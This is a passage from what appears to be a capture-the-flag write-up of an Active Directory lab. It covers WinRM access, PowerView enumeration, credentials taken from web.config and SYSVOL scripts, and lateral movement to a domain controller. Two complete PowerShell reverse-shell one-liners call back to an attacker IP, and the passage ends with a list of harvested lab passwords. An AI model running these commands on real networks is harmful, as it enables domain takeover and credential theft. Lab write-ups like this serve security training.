*Evil-WinRM* PS C:\Users\WebUser\Documents> whoami
webserver\webuser
```

# Pivoting #2
Since we are already on the machine, let's start enumerating, we can identify if we are inside an AD environment, if our DNS is not the same IP (192.168.122.228) then must probably we are inside an AD:
```bash
*Evil-WinRM* PS C:\Users\WebUser\Downloads> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WEBSERVER
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 52-54-00-9E-52-F4
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::b1ac:4b69:feac:4a7d%7(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.122.228(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Sunday, February 5, 2023 9:44:52 PM
   Lease Expires . . . . . . . . . . : Monday, February 6, 2023 10:10:41 AM
   Default Gateway . . . . . . . . . : 192.168.122.1
   DHCP Server . . . . . . . . . . . : 192.168.122.1
   DHCPv6 IAID . . . . . . . . . . . : 122835968
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-04-FF-30-52-54-00-74-F8-7C
   DNS Servers . . . . . . . . . . . : 192.168.122.130
                                       1.1.1.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```
And it seems like the DNS is in another machine, most probably the Domain Controller.
Now in order to escalate/pivote/lateral move into an AD environment, we need to retrieve the name of the Domain (e.g. fulcrum.htb, fulcrum.local, etc), so let's keep enumerating. After checking the system and it's interesting files we found a web server configuration file:
```powershell
*Evil-WinRM* PS C:\inetpub\wwwroot> type web.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration xmlns="http://schemas.microsoft.com/.NetConfiguration/v2.0">
    <appSettings />
    <connectionStrings>
        <add connectionString="LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local" name="ADServices" />
    </connectionStrings>
    <system.web>
        <membership defaultProvider="ADProvider">
            <providers>
                <add name="ADProvider" type="System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" connectionStringName="ADConnString" connectionUsername="FULCRUM\LDAP" connectionPassword="PasswordForSearching123!" attributeMapUsername="SAMAccountName" />
            </providers>
        </membership>
    </system.web>
<system.webServer>
   <httpProtocol>
      <customHeaders>
           <clear />
      </customHeaders>
   </httpProtocol>
        <defaultDocument>
            <files>
                <clear />
                <add value="Default.asp" />
                <add value="Default.htm" />
                <add value="index.htm" />
                <add value="index.html" />
                <add value="iisstart.htm" />
            </files>
        </defaultDocument>
</system.webServer>
</configuration>
```
We get the domain name as well as an interesting password, if we send an ICMP request, the IP of this subdomain is indeed the same as in our DNS:
```powershell
*Evil-WinRM* PS C:\inetpub\wwwroot> ping dc.fulcrum.local

Pinging dc.fulcrum.local [192.168.122.130] with 32 bytes of data:
```
To further enumerate the machine, since we already have credentials, we can upload [[PowerView]] to the machine: ^9b5e4e
```powershell
*Evil-WinRM* PS C:\Windows\Temp\PrivEsc> upload /usr/share/privesc/Windows/PowerView.ps1
Info: Uploading /usr/share/privesc/Windows/PowerView.ps1 to C:\Windows\Temp\PrivEsc\PowerView.ps1                                              
Data: 1027036 bytes of 1027036 bytes copied
Info: Upload successful!
```
Import the module:
```powershell
*Evil-WinRM* PS C:\Windows\Temp\PrivEsc> Import-Module .\PowerView.ps1
```
Since we have credentials, we can enumerate the domain as we pleased, but the password of such user is also giving us a hint, so let's try to abuse the Get-DomainUser module to retrieve info about users in the domain; according to the module's example we need to follow this steps:
```bash
$SecPassword = ConvertTo-SecureString 'PasswordForSearching123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('FULCRUM\LDAP', $SecPassword)
Get-DomainUser -Credential $Cred
```
Output:
```bash
...company               : fulcrum
logoncount            : 1
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : CN=BTables,CN=Users,DC=fulcrum,DC=local
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 5/9/2022 7:48:46 AM
name                  : BTables
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1105
samaccountname        : BTables
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/9/2022 2:48:46 PM
instancetype          : 4
usncreated            : 12628
objectguid            : 8e5db1d3-d28c-4aa1-b49d-f5f8216959fe
sn                    : BTables
info                  : Password set to ++FileServerLogon12345++
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local
dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : BTables
c                     : UK
lastlogon             : 5/9/2022 7:48:46 AM
streetaddress         : unknown
badpwdcount           : 0
cn                    : BTables
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:49 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:49 AM
usnchanged            : 16404
lastlogoff            : 12/31/1600 4:00:00 PM
postalcode            : 12345
```
We receive a lot of information, so we can filter only for useful information:
```bash
Get-DomainUser -Credential $Cred | select samaccountname, logoncount
samaccountname logoncount
-------------- ----------
Administrator           6
Guest                   0
krbtgt                  0
ldap                    3
923a                    0
BTables                 1
```
We can retrieve the groups for every user with the following filter:
```bash
*Evil-WinRM* PS C:\Windows\Temp\PrivEsc> Get-DomainUser -Credential $Cred | select samaccountname, logoncount, memberof

samaccountname logoncount memberof
-------------- ---------- --------
Administrator  6 {CN= ...DC=local...}
Guest          0 CN=Guests,CN=Builtin,DC=fulcrum,DC=local
krbtgt         0 CN=Denied RODC...,DC=local
ldap           4
923a           0 CN=Domain Admins,CN=Users,DC=fulcrum,DC=local
BTables                 1
```
As we can see, the user 923a is part of `Domain Admins` group, we also can get info from specific user:
```bash
*Evil-WinRM* PS C:\WIndows\Temp\PrivEsc> Get-DomainUser -Credential $Cred BTables


company               : fulcrum
logoncount            : 1
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : CN=BTables,CN=Users,DC=fulcrum,DC=local
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 5/9/2022 7:48:46 AM
name                  : BTables
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1105
samaccountname        : BTables
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/9/2022 2:48:46 PM
instancetype          : 4
usncreated            : 12628
objectguid            : 8e5db1d3-d28c-4aa1-b49d-f5f8216959fe
sn                    : BTables
info                  : Password set to ++FileServerLogon12345++
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local
dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : BTables
c                     : UK
lastlogon             : 5/9/2022 7:48:46 AM
streetaddress         : unknown
badpwdcount           : 0
cn                    : BTables
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:49 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:49 AM
usnchanged            : 16404
lastlogoff            : 12/31/1600 4:00:00 PM
postalcode            : 12345
```
On the field `info` we can retrieve a password that makes a reference to a file server, it is possible that there is another device in the network, so we can infer, since we are on the `WEBSERVER` device, and there is a `dc.fulcrum.local` machine, most probably there is a `file.fulcrum.local` so let's ping it:
```bash
*Evil-WinRM* PS C:\WIndows\Temp\PrivEsc> ping file.fulcrum.local

Pinging file.fulcrum.local [192.168.122.132]
```
Indeed there is another active machine, we can abuse of Invoke-Command module to execute commands on this machine so let's start by adding the credentials on memory: ^0145f0
```bash
PS> $Password = ConvertTo-SecureString '++FileServerLogon12345++' -AsPlainText -Force
PS> $Creds = New-Object System.Management.Automation.PSCredential('FULCRUM\BTables', $Password)
```
Then we can execute commands on the remote machine:
```
*PS> Invoke-Command -ComputerName file.fulcrum.local -Credential $Creds -ScriptBlock { whoami }
```
Since this is possible, we can execute a powershell [[Reverse Shells]] as follows: ^8c91ea
```bash
Invoke-Command -ComputerName file.fulcrum.local -Credential $Creds -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.10.14.3',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
```
And we get access to this system, it is important to highlight that only port 53 is not firewalled:
```bash
rlwrap nc -lvnp 53 
PS C:\Users\BTables\Documents> PS C:\Users\BTables\Documents> whoami
fulcrum\btables
```

### Privilege Escalation
Now that we are inside the file.fulcrum.local device, we can enumerate SMB Shares within the machine: ^cae2ef
```bash
PS C:\Users\BTables\Desktop> Get-SMBShare

Name   ScopeName Path Description  
----   --------- ---- -----------  
ADMIN$ *              Remote Admin 
C$     *              Default share
IPC$   *              Remote IPC 
```
We can try to connect to the shares on the DC:
```bash
PS C:\Users\BTables\Desktop> net use \\dc.fulcrum.local\IPC$ /user:FULCRUM\BTables ++FileServerLogon12345++
The command completed successfully.
```
And then we can list the shares in the DC:
```bash
PS C:\Users\BTables\Desktop> net view \\dc.fulcrum.local\
Shared resources at \\dc.fulcrum.local\
Share name  Type  Used as  Comment              
-------------------------------------------------------------------------------
NETLOGON    Disk           Logon server share   
SYSVOL      Disk           Logon server share   
The command completed successfully.
```
We can then mount the share SYSVOL on the compromised machine to check its content:
```bash
PS C:\Users\BTables\Desktop> net use x: \\dc.fulcrum.local\SYSVOL /user:FULCRUM\BTables ++FileServerLogon12345++

The command completed successfully.
```
And we found a ton of scripts inside the Share:
```bash
PS X:\fulcrum.local\scripts> dir
    Directory: X:\fulcrum.local\scripts


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----        2/12/2022  10:34 PM            340 00034421-648d-4835-9b23-c0d315d71ba3.ps1                                                                                                                                                                
-a----        2/12/2022  10:34 PM            340 0003ed3b-31a9-4d8f-a152-a234ecb522d4.ps1
```
By typing anyone of them we can see hardcoded credentials for which seems every user on the domain:
```bash
PS X:\fulcrum.local\scripts> type f36c55e0-2a7c-482f-bfbd-2f1e630e7297.ps1
# Map network drive v1.0
$User = 'b7a6'
$Pass = '@fulcrum_fab6c28177a8_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred
```
Only important credentials for us are for user "Administrator" or "923a" so let's search for any of them on the share: ^08db04
```bash
PS X:\fulcrum.local\scripts> Select-String -Path "X:\fulcrum.local\scripts\*.ps1" -Pattern Administrator
PS X:\fulcrum.local\scripts> Select-String -Path "X:\fulcrum.local\scripts\*.ps1" -Pattern 923a
#Output
3807dacb-db2a-4627-b2a3-123d048590e7.ps1:3:$Pass = '@fulcrum_df0923a7ca40_$' | ConvertTo-SecureString -AsPlainText -Force
a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1:2:$User = '923a'
```
Administrator credentials were not found but it seems like there is a file with 923a credentials so let's type it:
```bash
PS X:\fulcrum.local\scripts> type a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1
# Map network drive v1.0
$User = '923a'
$Pass = '@fulcrum_bf392748ef4e_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred
```
We get credentials, now let's get a reverse shell with Invoke-Command same as with this compromised machine:
```bash
PS X:\fulcrum.local\scripts> $Password = ConvertTo-SecureString '@fulcrum_bf392748ef4e_$' -AsPlainText -Force

PS X:\fulcrum.local\scripts> $Creds = New-Object System.Management.Automation.PSCredential('FULCRUM\923a', $Password)

PS X:\fulcrum.local\scripts> Invoke-Command -ComputerName dc.fulcrum.local -Credential $Creds -ScriptBlock { whoami }
fulcrum\923a
```
We get RCE, so let's retrieve the flag:
```bash
Invoke-Command -ComputerName dc.fulcrum.local -Credential $Creds -ScriptBlock { type C:\Users\Administrator\Desktop\root.txt }
```
### Post Exploitation
We can get a reverse shell directly into the DC with the following command:
```bash
Invoke-Command -ComputerName dc.fulcrum.local -Credential $Creds -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.10.14.3',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
```

### Credentials
```bash
# To login into the 192.168.122.228 machine via chisel->WinRM
WebUser:M4ng£m£ntPa55
# LDAP Credentials
FULCRUM\LDAP:PasswordForSearching123!
# Get-DomainUser credentials
BTables:++FileServerLogon12345++
# Credentials of 923a user under file.fulcrum.local
923a:@fulcrum_bf392748ef4e_$

```

### References

* [Finding and exploiting blind XXE vulnerabilities](https://portswigger.net/web-security/xxe/blind)



